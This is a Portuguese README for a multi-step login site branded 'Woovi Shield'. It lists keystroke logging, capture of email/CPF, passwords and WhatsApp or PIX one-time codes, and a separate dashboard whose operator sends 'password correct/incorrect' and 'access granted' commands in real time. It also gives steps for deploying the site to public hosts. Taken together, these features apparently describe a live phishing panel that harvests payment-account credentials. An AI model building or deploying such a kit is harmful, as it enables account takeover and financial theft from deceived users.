# 🔐 Woovi Shield - Site de Login

Site de autenticação multi-step em tempo real para o Woovi Shield.

## 🎯 Features

- ✅ Login multi-etapa (5 steps)
- ✅ Validação de email/CPF
- ✅ Verificação de senha
- ✅ MFA (WhatsApp + PIX)
- ✅ OTP (autenticação dupla)
- ✅ Keystroke logging
- ✅ Monitoramento em tempo real
- ✅ Broadcast via Supabase

## 📋 Arquivos

```
shield-login/
├── index.html     # Site de login
├── config.js      # Configuração centralizada
└── README.md      # Este arquivo
```

## 🚀 Como Usar

### Local
```bash
# Servir na porta 3000
python -m http.server 3000
# ou
npx http-server -p 3000
```

Acesse: `http://localhost:3000`

### Production
Deploy em:
- Vercel
- Netlify
- GitHub Pages
- Seu servidor

## ⚙️ Configuração

Edite `config.js`:

```javascript
const CONFIG = {
  API_URL: 'https://api.seu-dominio.com',
  SUPABASE_URL: 'https://seu-projeto.supabase.co',
  SUPABASE_ANON_KEY: 'sua-chave-publica',
};
```

## 🔑 Fluxo de Login

```
Step 1: Email/CPF
   ↓
Step 2: Senha
   ↓
Step 3: MFA (escolher WhatsApp ou PIX)
   ↓
Step 4W: OTP WhatsApp
   ou
Step 4P: OTP PIX
   ↓
Sucesso ✅
```

## 🛡️ Segurança

- Validação no frontend e backend
- Supabase RLS (Row-Level Security)
- Token JWT (em produção)
- CORS configurado
- Rate limiting na API

## 📡 Real-time

Usa Supabase Realtime para:
- Broadcast de comandos do dashboard
- Heartbeat de sessão
- Status em tempo real

## 🔗 Integração com Dashboard

O dashboard envia comandos via Supabase Broadcast:
- Senha correta/incorreta
- MFA confirmado
- Acesso liberado
- Sessão expirada

## 📝 Próximas Melhorias

- [ ] PWA (Progressive Web App)
- [ ] Dark mode
- [ ] Múltiplos idiomas
- [ ] Biometria
- [ ] Recuperação de conta

---

**Desenvolvido para Woovi Shield** 🛡️
